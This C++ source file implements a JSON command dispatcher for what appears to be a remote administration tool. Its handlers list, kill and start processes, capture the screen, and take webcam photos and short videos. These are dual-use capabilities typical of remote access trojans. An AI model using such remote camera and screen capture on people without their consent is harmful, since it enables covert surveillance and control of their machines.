#include "core/dispatcher.hpp"
#include "modules/process.hpp"
#include "modules/screen.hpp"
#include "modules/camera.hpp"

#include <iostream>

std::string Dispatcher::handle(const std::string& request_json)
{
    std::cout << "[Dispatcher] Incoming request: " << request_json << "\n";

    Json res;

    try {
        Json req = Json::parse(request_json);
        std::string cmd = req.value("cmd", "");

        if (cmd == "ping") {
            res = handle_ping(req);
        }
        else if (cmd == "process_list") {
            res = handle_process_list(req);
        }
        else if (cmd == "process_kill") {
            res = handle_process_kill(req);
        }
        else if (cmd == "process_start") {
            res = handle_process_start(req);
        }
        else if (cmd == "screen") {
            res = handle_screen(req);
        }
        else if (cmd == "camera") {
            res = handle_camera(req);
        }
        else if (cmd == "camera_video") {
            res = handle_camera_video(req);   
        }
        else if (cmd == "screen_stream") {
            res = handle_screen_stream(req);
        }
        else {
            res["status"]  = "error";
            res["message"] = "Unknown command: " + cmd;
        }
    }
    catch (const std::exception& e) {
        res["status"]  = "error";
        res["message"] = std::string("Exception: ") + e.what();
    }

    return res.dump();
}

// ----------------------- HANDLERS -----------------------

Json Dispatcher::handle_ping(const Json&)
{
    return {
        {"status", "ok"},
        {"message", "pong"}
    };
}

Json Dispatcher::handle_process_list(const Json&)
{
    ProcessManager pm;
    return pm.list_processes();
}

Json Dispatcher::handle_process_kill(const Json& req)
{
    int pid = req.value("pid", -1);
    if (pid < 0) {
        return {
            {"status", "error"},
            {"message", "Missing or invalid 'pid'"}
        };
    }

    ProcessManager pm;
    return pm.kill_process(pid);
}

Json Dispatcher::handle_process_start(const Json& req)
{
    if (!req.contains("path") || !req["path"].is_string()) {
        return {
            {"status", "error"},
            {"message", "Missing or invalid 'path'"}
        };
    }

    std::string path = req["path"].get<std::string>();
    ProcessManager pm;
    return pm.start_process(path);
}

Json Dispatcher::handle_screen(const Json&)
{
    std::string b64 = ScreenCapture::capture_base64();

    return {
        {"status", "ok"},
        {"image_base64", b64}
    };
}

Json Dispatcher::handle_camera(const Json& req)
{
    Camera cam;
    std::string b64;

    if (cam.captureFrame(b64)) {
        Json resp;
        resp["image_base64"] = b64;
        return resp;
    }

    Json err;
    err["error"] = "camera_failed";
    return err;
}

Json Dispatcher::handle_camera_video(const Json& req)
{
    int duration = 10;
    if (req.contains("duration") && req["duration"].is_number_integer()) {
        duration = req["duration"];
        if (duration <= 0) duration = 10;
        if (duration > 30) duration = 30; // tránh gửi video quá dài
    }

    Camera cam;
    std::string b64video;
    std::string format;

    if (!cam.captureVideo(duration, b64video, format)) {
        Json err;
        err["cmd"] = "camera_video";
        err["status"] = "error";
        err["error"] = "camera_video_failed";
        return err;
    }

    Json resp;
    resp["cmd"] = "camera_video";
    resp["status"] = "ok";
    resp["format"] = format;          // "avi"
    resp["video_base64"] = b64video;
    return resp;
}

Json Dispatcher::handle_screen_stream(const Json& req)
{
    int duration = 5;
    int fps = 3;

    if (req.contains("duration"))
        duration = req["duration"];

    if (req.contains("fps"))
        fps = req["fps"];

    Json resp;
    resp["cmd"] = "screen_stream";
    resp["status"] = "accepted";
    resp["duration"] = duration;
    resp["fps"] = fps;

    return resp;
}

